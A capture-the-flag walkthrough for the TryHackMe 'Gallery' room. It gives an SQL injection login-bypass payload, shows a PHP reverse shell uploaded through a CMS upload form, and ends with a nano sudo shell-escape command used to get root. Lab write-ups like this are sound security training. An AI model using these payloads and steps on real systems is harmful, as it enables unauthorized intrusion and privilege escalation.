---
title: "TryHackMe - Gallery"
author: Nasrallah
description: ""
date: 2022-11-09 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, sqli, reverse-shell, sudo]
img_path: /assets/img/tryhackme/gallery
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Gallery](https://tryhackme.com/room/gallery666) from [TryHackMe](https://tryhackme.com). The target is running a web server with a CMS that has a login page vulnerable to sql injection. After logging in we find an upload feature that we exploit to upload a reverse shell to the target and get a foothold. Looking through the system's files and directories we manage to find a password inside of a backup, we use that password to upgrade to another user. The new user is able to run a script that executes nano as root, so we exploit that to get a root shell.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.193.150
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Simple Image Gallery System
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

We have 2 open ports, port 80 running an Apache web server nad port 8080 running the same Apache server with Simple Image Gallery System.

## Web

Let's check the web page on port 80.

![](1.png)

We got the default page of Apache2. Let's run a directory scan.

```terminal
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.193.150/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/15 03:42:25 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/gallery              (Status: 301) [Size: 316] [--> http://10.10.193.150/gallery/]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 278]
===============================================================
```

We found a directory called **/gallery**, let's check it out.

![](2.png)

It's the login page of Simple Image Gallery System.

I tried some default credentials but couldn't login, but i managed to do so with a sql injection using the following payload as a username and password: `' or 1=1 -- -`.

![](3.png)

# **Foothold**

Now let's get a reverse shell.

I went to the Albums tab and clicked on a random album and saw that i can upload files.

![](4.png)

Let's upload [Pentest Monkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)'s reverse shell.

![](5.png)

Now setup a listener and click on the reverse shell file in the browser.

![](6.png)

Great! we got a reverse shell.


# **Privilege Escalation**

I run linpeas on the target and found a password.

![](7.png)

After some digging, we find that there is a backup of mike's home directory in /var/backups that has the history file where we found the password.

Let's switch user to mike.

![](8.png)

Great, now let's check our current privileges.

```terminal
mike@gallery:/$ sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh

```

There is a shell script that we can run as root, let's check it out.

![](9.png)

We see in this script when we enter read, it executes `nano`, it's just like running nano as root. Let's check [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo).

![](10.png)

To get root, we run the script, enter **read** wich pops a nano text editor.

After that press `ctrl` + `R` and `ctrl` + `X`, then we enter this command `reset; sh 1>&0 2>&0`.

![](11.png)

Now as user root, let's connect to mysql database and look for the admin's password hash.

![](12.png)

Congrats, we have rooted the machine successfully.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
